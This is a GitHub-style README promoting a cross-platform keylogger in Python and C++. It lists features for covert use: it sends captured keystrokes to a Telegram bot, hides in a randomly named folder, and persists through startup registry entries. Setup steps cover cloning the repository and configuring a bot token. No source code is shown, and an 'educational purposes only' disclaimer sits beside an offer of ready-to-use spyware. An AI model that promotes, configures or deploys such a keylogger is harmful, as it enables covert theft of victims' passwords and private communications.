# 🌟 Keylogger Repository Overview

Welcome to our sophisticated keylogger project! This repository contains an advanced keylogger crafted in **Python** and **C++**, designed to seamlessly operate across major operating systems, including **Windows** and **Linux**. 🖥️💻

## 🎉 Features

- **🌍 Cross-Platform Compatibility**: Our keylogger functions perfectly on various operating systems, ensuring versatility.
- **📱 Responsive Design**: Enjoy a fully responsive interface that makes navigation a breeze.
- **💬 Telegram Integration**: Automatically sends logged keystrokes to your specified chat via a Telegram bot, keeping you updated in real-time.
- **⚡ WebSocket Communication**: Utilizing Python, it ensures real-time data transmission for swift interactions.
- **🔒 Self-Metling**: The keylogger cleverly hides itself in a directory with a random 16-character name in the C:\ directory and /home/ in Linux.
- **✨ Startup Integration**: Automatically integrates into the system startup through the registry for continuous operation.
- **📊 Inline Panel**: An intuitive inline panel displays target options and allows for easy selection for log transmission.

## 🛠️ Installation

Follow these simple steps to get started:

1. **Clone the repository**:
       ```
      git clone https://github.com/xelroth/keylogger.git
       ```
   
   
2. **Navigate to the project directory**:
       ```
      cd keylogger
       ```
   
   
3. **Configure bot_panel.py with your bot-token etc... and port in main keylogger file and server.py.**:
       ```
       bot = KeyloggerBot(name="Keylogger", api_hash='', api_id='', bot_token='token')
       ```


5. **Install required Python packages**:
       ```
       pyrogram, tgcrypto, datetime, websocket, subprocess, platform
       ```   


6. **Compile the C++ project** for the operating system of your choice.


## 📁 Code Structure

- **C++ Keylogger**: Responsible for capturing keystrokes efficiently and accurately.
- **Python WebSocket**: Manages real-time communication between the keylogger and your receiving end.
- **Python Telegram Bot**: Easily sends collected logs to your designated Telegram chat.

## 🤝 Contributing

We welcome all contributions! 🌈 Please feel free to fork the repository and submit a pull request. Your ideas and improvements are highly valued!

## 📜 License

This project is licensed under the **MIT License**. For details, please refer to the LICENSE file.

## ⚠️ Disclaimer

This software is intended for **educational purposes only**. Please use responsibly and ensure compliance with all local laws and regulations. 🚨 

---

Thank you for exploring this project! If you have any questions or suggestions, feel free to reach out. Happy coding! 🎉
